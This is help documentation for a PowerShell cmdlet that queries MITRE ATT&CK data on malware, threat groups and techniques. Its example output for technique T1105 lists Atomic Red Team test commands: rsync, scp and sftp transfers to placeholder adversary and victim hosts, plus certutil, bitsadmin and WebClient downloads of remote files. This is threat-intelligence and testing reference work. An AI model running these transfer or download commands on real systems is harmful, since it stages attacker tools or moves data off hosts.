# SYNOPSIS

Get-AttckMalware gives the user access to all Malware defined within the MITRE ATT&CK framework

## DESCRIPTION

Get-AttckMalware can access all Malware defined within the MITRE ATT&CK framework.
You can also select a single Malware object by providing a Name value

## PARAMETERS

### PARAMETER Name

A argument completer parameter to retrieve data about a specific Malware by Name

## EXAMPLES

### EXAMPLE Access All Malware Information

```powershell
C:/> Get-AttckMalware
```

```output
CreatedByReference : identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
Revoked            : No revoked attribute found
Label              : {malware}
Platform           : {Windows}
Id                 : S0066
Name               : 3PARA RAT
Aliases            : 
Description        : [3PARA RAT](https://attack.mitre.org/software/S0066) is a remote access tool (RAT) programmed in C++ that has been used by [Putter 
                     Panda](https://attack.mitre.org/groups/G0024). (Citation: CrowdStrike Putter Panda)
Reference          : {@{Description=No description attribute found; Url=https://attack.mitre.org/software/S0066; ExternalId=S0066; SourceName=mitre-attack}, 
                     @{Description=Crowdstrike Global Intelligence Team. (2014, June 9). CrowdStrike Intelligence Report: Putter Panda. Retrieved January 22, 2016.; 
                     Url=http://cdn0.vox-cdn.com/assets/4589853/crowdstrike-intelligence-report-putter-panda.original.pdf; ExternalId=No external_id attribute found; 
                     SourceName=CrowdStrike Putter Panda}}
Created            : 05/31/2017 21:32:44
Modified           : 10/17/2018 00:14:20
Stix               : malware--7bec698a-7e20-4fd3-bb6a-12787770fb1a
Type               : malware
Wiki               : https://attack.mitre.org/software/S0066
Contributor        : 

CreatedByReference : identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
Revoked            : No revoked attribute found
Label              : {malware}
Platform           : {Windows}
Id                 : S0065
Name               : 4H RAT
Aliases            : 
Description        : [4H RAT](https://attack.mitre.org/software/S0065) is malware that has been used by [Putter Panda](https://attack.mitre.org/groups/G0024) since at 
                     least 2007. (Citation: CrowdStrike Putter Panda)
Reference          : {@{Description=No description attribute found; Url=https://attack.mitre.org/software/S0065; ExternalId=S0065; SourceName=mitre-attack}, 
                     @{Description=Crowdstrike Global Intelligence Team. (2014, June 9). CrowdStrike Intelligence Report: Putter Panda. Retrieved January 22, 2016.; 
                     Url=http://cdn0.vox-cdn.com/assets/4589853/crowdstrike-intelligence-report-putter-panda.original.pdf; ExternalId=No external_id attribute found; 
                     SourceName=CrowdStrike Putter Panda}}
Created            : 05/31/2017 21:32:43
Modified           : 10/17/2018 00:14:20
Stix               : malware--8e461ca3-0996-4e6e-a0df-e2a5bbc51ebc
Type               : malware
Wiki               : https://attack.mitre.org/software/S0065
Contributor        : 

...
```

### EXAMPLE Retrieve a specific Malware by Name

```powershell
C:/> Get-AttckMalware -Name 'Agent Tesla'
```

```output
CreatedByReference : identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
Revoked            : No revoked attribute found
Label              : {malware}
Platform           : {Windows}
Id                 : S0331
Name               : Agent Tesla
Aliases            : 
Description        : [Agent Tesla](https://attack.mitre.org/software/S0331) is a spyware Trojan written in visual basic.(Citation: Fortinet Agent Tesla April 2018)
Reference          : {@{Description=No description attribute found; Url=https://attack.mitre.org/software/S0331; ExternalId=S0331; SourceName=mitre-attack}, 
                     @{Description=(Citation: Fortinet Agent Tesla April 2018)(Citation: Talos Agent Tesla Oct 2018)(Citation: DigiTrust Agent Tesla Jan 2017); Url=No 
                     url attribute found; ExternalId=No external_id attribute found; SourceName=Agent Tesla}, @{Description=Zhang, X. (2018, April 05). Analysis of 
                     New Agent Tesla Spyware Variant. Retrieved November 5, 2018.; 
                     Url=https://www.fortinet.com/blog/threat-research/analysis-of-new-agent-tesla-spyware-variant.html; ExternalId=No external_id attribute found; 
                     SourceName=Fortinet Agent Tesla April 2018}, @{Description=Brumaghin, E., et al. (2018, October 15). Old dog, new tricks - Analysing new 
                     RTF-based campaign distributing Agent Tesla, Loki with PyREbox. Retrieved November 5, 2018.; 
                     Url=https://blog.talosintelligence.com/2018/10/old-dog-new-tricks-analysing-new-rtf_15.html; ExternalId=No external_id attribute found; 
                     SourceName=Talos Agent Tesla Oct 2018}…}
Created            : 01/29/2019 18:44:04
Modified           : 04/16/2019 14:30:35
Stix               : malware--e7a5229f-05eb-440e-b982-9a6d2b2b87c8
Type               : malware
Wiki               : https://attack.mitre.org/software/S0331
Contributor        : 
```

### EXAMPLE Retrieve which actors use all or specific piece of Malware

```powershell
C:/> (Get-AttckMalware -Name 'Agent Tesla').Actors()
```

```output
CreatedByReference : identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
Revoked            : No revoked attribute found
Id                 : G0083
Name               : SilverTerrier
Aliases            : SilverTerrier
Description        : [SilverTerrier](https://attack.mitre.org/groups/G0083) is a Nigerian threat group that has been seen active since 2014. 
                     [SilverTerrier](https://attack.mitre.org/groups/G0083) mainly targets organizations in high technology, higher education, and 
                     manufacturing.(Citation: Unit42 SilverTerrier 2018)(Citation: Unit42 SilverTerrier 2016)
Reference          : {@{Description=No description attribute found; Url=https://attack.mitre.org/groups/G0083; ExternalId=G0083; SourceName=mitre-attack}, 
                     @{Description=(Citation: Unit42 SilverTerrier 2018)(Citation: Unit42 SilverTerrier 2016); Url=No url attribute found; ExternalId=No external_id 
                     attribute found; SourceName=SilverTerrier}, @{Description=Unit42. (2016). SILVERTERRIER: THE RISE OF NIGERIAN BUSINESS EMAIL COMPROMISE. 
                     Retrieved November 13, 2018.; Url=https://www.paloaltonetworks.com/apps/pan/public/downloadResource?pagePath=/content/pan/en_US/resources/whitepap
                     ers/unit42-silverterrier-rise-of-nigerian-business-email-compromise; ExternalId=No external_id attribute found; SourceName=Unit42 SilverTerrier 
                     2018}, @{Description=Renals, P., Conant, S. (2016). SILVERTERRIER: The Next Evolution in Nigerian Cybercrime. Retrieved November 13, 2018.; 
                     Url=https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/reports/Unit_42/silverterrier-next-evolution-in-nigerian-cybercrime.pdf; 
                     ExternalId=No external_id attribute found; SourceName=Unit42 SilverTerrier 2016}}
Created            : 01/29/2019 21:36:59
Modified           : 04/12/2019 16:33:51
Stix               : intrusion-set--76565741-3452-4069-ab08-80c0ea95bbeb
Type               : intrusion-set
Wiki               : https://attack.mitre.org/groups/G0083
Contributor        : 
```

### EXAMPLE Retrieve which techniques apply to a specific piece of Malware

```powershell
C:/> (Get-AttckMalware -Name 'Agent Tesla').Techniques()
```

```output
CreatedByReference   : identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
Platform             : {Linux, macOS, Windows}
Permission           : {User}
Bypass               : {}
EffectivePermissions : {}
CommandList          : {rsync -r #{local_path} victim@#{remote_host}:#{remote_path}
                        rsync -r /tmp/adversary-rsync/ victim@#{remote_host}:#{remote_path}
                        rsync -r #{local_path} #{username}@victim-host:#{remote_path}
                        rsync -r #{local_path} #{username}@victim-host:/tmp/victim-files
                        rsync -r adversary@#{remote_host}:#{remote_path} #{local_path}
                        rsync -r adversary@#{remote_host}:#{remote_path} /tmp/victim-files
                        rsync -r #{username}@adversary-host:#{remote_path} #{local_path}
                        rsync -r #{username}@adversary-host:/tmp/adversary-rsync/ #{local_path}
                        scp #{local_file} victim@#{remote_host}:#{remote_path}
                        scp /tmp/adversary-scp victim@#{remote_host}:#{remote_path}
                        scp #{local_file} #{username}@victim-host:#{remote_path}
                        scp #{local_file} #{username}@victim-host:/tmp/victim-files/
                        scp adversary@#{remote_host}:#{remote_file} #{local_path}
                        scp adversary@#{remote_host}:/tmp/adversary-scp #{local_path}
                        scp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/
                        scp #{username}@adversary-host:#{remote_file} /tmp/victim-files/
                        sftp victim@#{remote_host}:#{remote_path} <<< $'put #{local_file}'
                        sftp victim@#{remote_host}:#{remote_path} <<< $'put /tmp/adversary-sftp'
                        sftp #{username}@victim-host:#{remote_path} <<< $'put #{local_file}'
                        sftp #{username}@victim-host:/tmp/victim-files/ <<< $'put #{local_file}'
                        sftp adversary@#{remote_host}:#{remote_file} #{local_path}
                        sftp adversary@#{remote_host}:/tmp/adversary-sftp #{local_path}
                        sftp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/
                        sftp #{username}@adversary-host:#{remote_file} /tmp/victim-files/
                        cmd /c certutil -urlcache -split -f #{remote_file} Atomic-license.txt
                        cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt
                        $datePath = "certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)"
                       New-Item -Path $datePath -ItemType Directory
                       Set-Location $datePath
                       certutil -verifyctl -split -f #{remote_file}
                       Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }
                        $datePath = "certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)"
                       New-Item -Path $datePath -ItemType Directory
                       Set-Location $datePath
                       certutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
                       Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }
                        C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH #{remote_file} #{local_path}
                        C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH #{remote_file} Atomic-license.txt
                        C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH 
                       https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt #{local_path}
                        (New-Object System.Net.WebClient).DownloadFile("#{remote_file}", "Atomic-license.txt") (New-Object 
                       System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", "Atomic-license.txt")    
                        }
Commands             : {                                     }
Queries              : {                       }
Datasets             : {     }
Detections           : {$null}
Network              : True
Remote               : No x_mitre_remote_support attribute found
SystemRequirements   : No x_mitre_system_requirements attribute found
Detection            : Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files 
                       on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.
                       
                       Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes 
                       utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to 
                       detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)
DataSource           : {File monitoring, Packet capture, Process use of network, Netflow/Enclave netflow…}
Id                   : T1105
Name                 : Remote File Copy
Aliases              : 
Description          : Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Files may be copied 
                       from an external adversary-controlled system through the Command and Control channel to bring tools into the victim network or through 
                       alternate protocols with another tool such as [FTP](https://attack.mitre.org/software/S0095). Files can also be copied over on Mac and Linux 
                       with native tools like scp, rsync, and sftp.
                       
                       Adversaries may also copy files laterally between internal victim systems to support Lateral Movement with remote Execution using inherent file 
                       sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with [Windows Admin 
                       Shares](https://attack.mitre.org/techniques/T1077) or [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076).
Reference            : {@{Description=No description attribute found; Url=https://attack.mitre.org/techniques/T1105; ExternalId=T1105; SourceName=mitre-attack}, 
                       @{Description=Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 
                       20, 2016.; Url=https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf; ExternalId=No external_id attribute found; SourceName=University of 
                       Birmingham C2}}
Created              : 05/31/2017 21:31:16
Modified             : 07/18/2019 17:47:57
Stix                 : attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add
Type                 : attack-pattern
Wiki                 : https://attack.mitre.org/techniques/T1105
Contributor          : 

...
```

## OUTPUTS

PSAttck.Enterprise.Malware

## NOTES

Created By: Josh Rickard (MSAdministrator)
Date: 21JAN2020
